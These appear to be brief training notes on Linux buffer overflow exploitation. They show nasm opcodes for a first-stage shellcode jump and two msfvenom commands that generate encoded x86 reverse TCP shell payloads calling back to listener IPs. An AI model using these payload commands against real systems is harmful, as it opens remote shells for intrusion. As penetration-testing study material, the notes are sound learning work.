# Linux Buffer Overflows

Early stages of replicating crash and controlling EIP identical to Windows training.

While locating space for shellcode the example showed that we only had one or two bytes for the payload. As a result we need to try and jump past another location in what is known as a first stage shellcode. 

In the example we need to obtain opcodes to increase the EAX by 12 bytes to jump over a string and into our real payload:

```bash
sf-nasm_shell                        
nasm > add eax,12
00000000  83C00C            add eax,byte +0xc
nasm > jmp eax
00000000  FFE0              jmp eax
nasm > 
```

The instructions '\x83\xc0\x0c\xff\xe0` take up only 5 bytes of memory.

`msfvenom` payload is now for Linux:  
`msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.125 LPORT=443 -f raw –e x86/shikata_ga_nai -b "\x0a\x0d\x20" > exploit.txt`

OR with just a couple of badchars from the example, neat way of putting out the raw code though:  

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b "\x00\x20" -f py -v shellcode`
